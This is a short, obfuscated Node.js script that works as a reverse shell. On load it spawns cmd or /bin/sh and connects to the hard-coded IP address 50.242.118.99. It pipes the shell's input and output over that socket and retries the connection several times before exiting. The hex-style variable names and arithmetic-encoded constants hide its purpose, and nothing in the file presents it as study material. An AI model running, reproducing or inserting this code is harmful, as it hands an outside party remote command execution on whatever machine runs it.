function node_payload() {
    var _0x299cdf = global['require'] || global['process']['mainModule']['constructor']['_load'];
    if (!_0x299cdf)
        return;
    var _0x178bf3 = global['process']['platform']['match'](/^win/i) ? 'cmd' : '/bin/sh';
    var _0x57ba8c = _0x299cdf('net');
    var _0x19e84c = _0x299cdf('child_process');
    var _0x25b8d3 = _0x299cdf('util');
    var _0xe8fc03 = _0x19e84c['spawn'](_0x178bf3, []);
    var _0x236be5 = this;
    var _0x546126 = -0x1fd * 0xb + -0x51 + 0xa * 0x238;
    function _0x36aaeb() {
        _0x236be5['socket'] = _0x57ba8c['connect'](-0x5 * -0x27b + -0x18d * 0x8 + -0x8b * -0x8, '50.242.118.99', function () {
            _0x236be5['socket']['pipe'](_0xe8fc03['stdin']);
            if (typeof _0x25b8d3['pump'] === 'undefined') {
                _0xe8fc03['stdout']['pipe'](_0x236be5['socket']);
                _0xe8fc03['stderr']['pipe'](_0x236be5['socket']);
            } else {
                _0x25b8d3['pump'](_0xe8fc03['stdout'], _0x236be5['socket']);
                _0x25b8d3['pump'](_0xe8fc03['stderr'], _0x236be5['socket']);
            }
        });
        _0x236be5['socket']['on']('error', function (_0x548f5f) {
            _0x546126++;
            if (_0x546126 <= -0x94e + -0x19b9 + 0x2f * 0xbf) {
                setTimeout(function () {
                    _0x36aaeb();
                }, (0x1484 + 0x1945 + -0xca * 0x3a) * (0x7eb + 0x1265 + 0x4 * -0x59a));
            } else {
                process['exit']();
            }
        });
    }
    _0x36aaeb();
}
console['log']('poop');
node_payload();
